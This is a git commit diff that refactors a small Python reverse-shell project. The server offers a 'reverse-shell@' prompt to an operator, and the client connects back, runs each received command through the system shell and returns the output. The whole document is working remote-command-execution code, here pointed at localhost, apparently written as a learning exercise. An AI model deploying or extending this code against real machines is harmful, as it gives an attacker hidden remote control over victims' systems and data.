0d27e5c9152f54e6309427444c3e51f1c947a8df
angeling11 <angel-na@hotmail.es>
2020-03-20 19:29:07 -0600

    implement functions & exception handler

--- client.py
+++ client.py
@@ -2,25 +2,54 @@
 
 import socket
 import subprocess
+import json
 
-# Create socket
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+def reliable_send(data):
+	# If data is bytes
+	if type(data) is bytes:
+		# Convert to str
+		data = data.decode()
 
-# Connect socket
-s.connect(("127.0.0.1", 54321))
+	json_data = json.dumps(data)
+	s.send(json_data.encode())
 
-print("Connection Established to Server")
+def reliable_recv():
+	json_data = ""
+	while True:
+		try:
+			json_data += s.recv(1024).decode()
+			return json.loads(json_data)
+		except ValueError:
+			continue
+def init_client():
+	global s
 
-while True:
-	# Send/Receive commands
-	command = s.recv(1024).decode()
-	if(command == "q"):
-		print("Connection Closed!")
-		break
-	else:
-		proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-		result = proc.stdout.read() + proc.stderr.read()
-		s.send(result)
+	# Create socket
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+	# Connect socket
+	s.connect(("127.0.0.1", 54321))
+
+	print("Connection Established to Server")
+
+def shell():
+	while True:
+		# Send/Receive commands
+		command = reliable_recv()
+		if(command == "q" or command == "exit"):
+			print("Connection Closed!")
+			break
+		else:
+			try:
+				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+				result = proc.stdout.read() + proc.stderr.read()
+				reliable_send(result)
+			except:
+				reliable_send("Can't execute that command!")
+
+# Functions call
+init_client()
+shell()
 
 # Close connection
 s.close()
--- server.py
+++ server.py
@@ -1,32 +1,70 @@
 #!/usr/bin/python
 
 import socket
+import json
+import signal
+import sys
 
-# Create socket
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+def c_signal(sig, frame):
+	print()
+	try:
+		reliable_send("exit")
+		print("Connection Closed!")
+	except NameError:
+		pass
+	s.close()
+	sys.exit(0)
 
-# Bind socket
-s.bind(("127.0.0.1", 54321))
+def reliable_send(data):
+	json_data = json.dumps(data)
+	target.send(json_data.encode())
 
-# Number of connections
-s.listen(1)
-print("Listening for Incoming Connections")
+def reliable_recv():
+	json_data = ""
+	while True:
+		try:
+			json_data += target.recv(1024).decode()
+			return json.loads(json_data)
+		except ValueError:
+			continue
 
-# Accept connection
-target, ip = s.accept()
+def init_server():
+	global s, ip, target
 
-print("Target Connected!")
+	# Create socket
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-while True:
-	# Send/Receive commands
-	command = input("reverse-shell@%s#~: " % ip[0])
-	target.send(command.encode())
-	if(command == "q"):
-		break
-	else:
-		result = target.recv(2024).decode()
-		print(result)
+	# Bind socket
+	s.bind(("127.0.0.1", 54321))
+
+	# Number of connections
+	s.listen(1)
+	print("Listening for Incoming Connections")
+
+	# Accept connection
+	target, ip = s.accept()
+
+	print("Target Connected!")
+
+def shell():
+	while True:
+		# Send/Receive commands
+		command = input("reverse-shell@%s:%d:~# " % (ip[0], ip[1]))
+		reliable_send(command)
+		if(command == "q" or command == "exit"):
+			break
+		else:
+			result = reliable_recv()
+			print(result)
+
+# Signal listener
+signal.signal(signal.SIGINT, c_signal)
+
+# Functions call
+init_server()
+shell()
 
 # Close connection
+print("Connection Closed!")
 s.close()
